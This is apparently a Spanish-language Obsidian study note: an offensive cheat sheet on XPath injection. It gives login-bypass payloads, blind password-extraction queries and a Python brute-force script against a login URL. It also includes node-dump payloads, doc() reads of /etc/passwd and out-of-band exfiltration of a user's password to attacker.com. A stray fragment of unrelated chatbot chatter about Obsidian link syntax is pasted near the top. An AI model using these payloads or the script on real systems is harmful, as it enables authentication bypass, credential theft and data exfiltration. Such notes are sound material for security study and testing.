## 📚 Índice

- [[#📌 ¿Cuándo pensar en XPath Injection?]]
- [[#🧠 Diferencias clave vs SQLi]]
- [[#🧩 XPath básico (solo lo necesario)]]
    - [[#Nodos esenciales]]
- [[#🔥 Detección rápida (payloads iniciales)]]
- [[#🧪 Detección de estructura (Schema discovery)]]
- [[#🧱 Robo del esquema (paso a paso)]]
- [[#🏷️ Descubrir nombres de etiquetas]]
- [[#🔐 Bypass de autenticación]]
- [[#👁️‍🗨️ Blind XPath Injection (la parte seria)]]
- [[#🐍 Script de extracción (plantilla)]]
- [[#📤 Exfiltración completa de nodos]]
- [[#📁 Lectura de archivos (cuando se puede)]]
- [[#🌍 OOB (Out-Of-Band) — nivel DIOS]]
- [[#🧰 Herramientas automáticas]]
- [[#🧠 Flujo de trabajo real (mental checklist)]]

    

---

### POR QUÉ AHORA SÍ FUNCIONA

- `[[#Encabezado]]` → **link interno real**
    
- Emojis ✅
    
- Signos ✅
    
- Paréntesis ✅
    
- Guiones largos `—` ✅
    
- Sin inventar títulos ❌
    
- Sin reinterpretar ❌
    

Si quieres, en el próximo mensaje te explico **en 30 segundos**:

- cuándo usar `[[Nota]]`
    
- cuándo usar `[[#Heading]]`
    
- cuándo usar `[[Nota#Heading]]`
    

Pero ahora esto **sí está bien hecho**.
> **XPath Injection** es básicamente **SQLi pero para XML**.  
> El mismo pecado mortal: **concatenar input del usuario dentro de una query**, solo que aquí el backend decidió usar **XML como pseudo-base de datos relacional** (sí, un crimen arquitectónico).

---

## 📌 ¿Cuándo pensar en XPath Injection?

Piensa en **XPath Injection** cuando:

- SQLi **no funciona**
    
- No hay errores de DB clásicos
    
- La app:
    
    - Usa **XML**
        
    - Devuelve **respuestas booleanas** (login válido / inválido)
        
    - Se comporta **muy similar a un SQLi ciego**
        
- Al interceptar la request:
    
    - Ves **queries estructuradas**
        
    - No hay `--`, `#`, `/* */`
        
    - **Cerrar comillas importa mucho**
        

👉 **Regla mental:**

> _“Si no es SQL y se comporta como SQL… probablemente es XPath”_

---

## 🧠 Diferencias clave vs SQLi

|SQLi|XPath|
|---|---|
|`--` comentarios|❌ No existen|
|`OR 1=1`|✅ pero con sintaxis XPath|
|`UNION SELECT`|❌|
|Columnas|❌ (son nodos)|
|Tablas|❌ (son etiquetas XML)|
|`information_schema`|❌|
|`substring()`|✅|
|`string-length()`|✅|
|Blind extraction|✅ MUY común|

⚠️ **Truco clave**  
Muchas veces **dejas una comilla abierta** para que **la query original la cierre**.

---

## 🧩 XPath básico (solo lo necesario)

### Nodos esenciales

```
/        raíz
//       cualquier profundidad
.        nodo actual
..       nodo padre
@        atributos
*        wildcard
node()   cualquier nodo
```

---

## 🔥 Detección rápida (payloads iniciales)

```
' or '1'='1
" or "1"="1
' or true() or '
' or 1 or '
```

Si **el comportamiento cambia** → vulnerable.

---

## 🧪 Detección de estructura (Schema discovery)

### ¿Existe XML?

```
and count(/*)=1'
```

### ¿Cuántos nodos raíz?

```
and count(/*)=1
```

### Enumerar profundidad

```
and count(/*[1]/*)=X
and count(/*[1]/*[1]/*)=X
```

👉 Con esto **reconstruyes el árbol XML completo**, aunque no conozcas los nombres.

---

## 🧱 Robo del esquema (paso a paso)

### Contar nodos

```
and count(/*[1]/*)=2
and count(/*[1]/*[1]/*)=1
and count(/*[1]/*[2]/*)=3
```

Eso equivale a:

```xml
<root>
  <a>
    <b />
  </a>
  <c>
    <d />
    <e />
    <f>
      <h />
    </f>
  </c>
</root>
```

---

## 🏷️ Descubrir nombres de etiquetas

### Confirmar nombre

```
and name(/*[1])="root"
```

### Fuerza bruta carácter por carácter

```
and substring(name(/*[1]/*[1]),1,1)="u"
```

### Con codepoints (blind)

```
and string-to-codepoints(substring(name(/*[1]),1,1))=114
```

---

## 🔐 Bypass de autenticación

### Query típica vulnerable

```
/users/user[name='USER' and password='PASS']
```

### Bypass clásico

```
' or '1'='1
```

### Double OR (1 solo campo vulnerable)

```
' or true() or '
```

### Seleccionar cuenta específica

```
'or contains(name,'adm') or'
'or position()=1 or'
```

---

## 👁️‍🗨️ Blind XPath Injection (la parte seria)

### Longitud del valor

```
' or string-length(//user[1]/password)=8 or ''='
```

### Extraer carácter por carácter

```
' or substring(//user[1]/password,1,1)="a" or ''='
```

### Loop mental

1. Sacas longitud
    
2. Iteras posición
    
3. Bruteforce charset
    

---

## 🐍 Script de extracción (plantilla)

```python
import requests, string

alphabet = string.ascii_letters + string.digits + "_{}-"
flag = ""

for i in range(1, 30):
    for c in alphabet:
        payload = f"' or substring(//user[1]/password,{i},1)='{c}' or ''='"
        r = requests.get("http://target/login?user=admin&pass="+payload)
        if "Welcome" in r.text:
            flag += c
            print(flag)
            break
```

---

## 📤 Exfiltración completa de nodos

```
')] | //user/node()[('')=('
')] | //node()[('')=('
')] | //user/*[3] | a[('
```

👉 Con esto **vuelas todo el XML**.

---

## 📁 Lectura de archivos (cuando se puede)

```
doc('file:///etc/passwd')
doc('file:///var/www/config.xml')
```

Blind:

```
substring(doc('file:///etc/passwd'),1,1)="r"
```

---

## 🌍 OOB (Out-Of-Band) — nivel DIOS

```
doc(concat("http://attacker.com/", //user[1]/password))
```

O versión silenciosa:

```
doc-available(concat("http://attacker.com/", //user[1]/password))
```

---

## 🧰 Herramientas automáticas

- **xcat**
    
    ```
    https://xcat.readthedocs.io/
    ```
    
- Burp (todo manual suele ser mejor aquí)
    

---

## 🧠 Flujo de trabajo real (mental checklist)

```
1. Interceptar request (Burp)
2. Probar SQLi → nada
3. Probar OR booleanos XPath
4. Confirmar XML con count(/*)
5. Enumerar profundidad
6. Reconstruir esquema
7. Bypass auth
8. Blind extraction
9. Dump completo / OOB
```

---

